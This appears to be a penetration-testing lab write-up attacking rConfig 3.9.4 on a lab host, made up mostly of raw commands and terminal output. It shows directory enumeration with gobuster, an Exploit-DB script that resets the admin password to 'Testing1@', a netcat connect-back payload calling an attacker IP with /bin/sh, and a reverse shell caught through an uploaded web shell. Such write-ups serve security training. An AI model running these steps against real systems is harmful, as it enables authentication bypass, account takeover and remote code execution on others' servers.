# 5 :8081 rconfig

```
https://192.168.174.57:8081/login.php
rConfig Management Login Page
rConfig Version 3.9.4

$ gobuster dir -u https://192.168.174.57:8081 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 80 -k
===============================================================
/login.php            (Status: 200) [Size: 5881]
/images               (Status: 301) [Size: 243] [--> https://192.168.174.57:8081/images/]
/search.php           (Status: 302) [Size: 0] [--> https://192.168.174.57:8081/login.php]
/index.php            (Status: 200) [Size: 83]
/categories.php       (Status: 302) [Size: 0] [--> https://192.168.174.57:8081/login.php]
/css                  (Status: 301) [Size: 240] [--> https://192.168.174.57:8081/css/]
/includes             (Status: 301) [Size: 245] [--> https://192.168.174.57:8081/includes/]
/lib                  (Status: 301) [Size: 240] [--> https://192.168.174.57:8081/lib/]
/README               (Status: 200) [Size: 1039]
/js                   (Status: 301) [Size: 239] [--> https://192.168.174.57:8081/js/]
/settings.php         (Status: 302) [Size: 0] [--> https://192.168.174.57:8081/login.php]
/dashboard.php        (Status: 302) [Size: 0] [--> https://192.168.174.57:8081/login.php]
/devices.php          (Status: 302) [Size: 0] [--> https://192.168.174.57:8081/login.php]
/vendors.php          (Status: 302) [Size: 0] [--> https://192.168.174.57:8081/login.php]
/LICENSE.txt          (Status: 200) [Size: 35147]
/compatibility.php    (Status: 200) [Size: 5817]
/CHANGELOG            (Status: 200) [Size: 17136]
/commands.php         (Status: 302) [Size: 0] [--> https://192.168.174.57:8081/login.php]
/snippets.php         (Status: 302) [Size: 0] [--> https://192.168.174.57:8081/login.php]
/ldap                 (Status: 301) [Size: 241] [--> https://192.168.174.57:8081/ldap/]
/useradmin.php        (Status: 302) [Size: 0] [--> https://192.168.174.57:8081/login.php]
/scheduler.php        (Status: 302) [Size: 0] [--> https://192.168.174.57:8081/login.php]

# rconfig v3.9.4 is exploitable
# but unauth RCE is not working
# found https://gist.github.com/farid007/9f6ad063645d5b1550298c8b9ae953ff
# comment says 
    1. If you don't have admin panel credentials.
    2. You can try using this exploit-> https://www.exploit-db.com/exploits/48878
    3. Select option 2 after running the above exploit script and this should update the password of admin user to Testing1@
    4. And if successful, you can do the above mentioned Arbitrary File Upload vulnerability thing .

Using https://www.exploit-db.com/exploits/4887
$ python3 48878.py
Connecting to: https://192.168.174.57:8081/
Connect back is set to: nc 192.168.49.174 9001 -e /bin/sh, please launch 'nc -lv 9001'
Version is rConfig Version 3.9.4 it may not be vulnerable
Remote Code Execution + Auth bypass rConfig 3.9.5 by Daniel Monzón
In the last stage if your payload is a reverse shell, the exploit may not launch the success message, but check your netcat ;)
Note: preferred method for auth bypass is 1, because it is less 'invasive'
Note2: preferred method for RCE is 2, as it does not need you to know if, for example, netcat has been installed in the target machine
Choose method for authentication bypass:
        1) User creation
        2) User enumeration + User edit
Method>2
(+) The admin user is present in this rConfig instance
(+) The new password for the admin user is Testing1@

# Uploading shell manually
Using https://gist.github.com/farid007/9f6ad063645d5b1550298c8b9ae953ff

$ nc -lvnp 445
listening on [any] 445 ...
connect to [192.168.49.174] from (UNKNOWN) [192.168.174.57] 47340
SOCKET: Shell has connected! PID: 3204
whoami;id;hostname
apache
uid=48(apache) gid=48(apache) groups=48(apache)
quackerjack
```
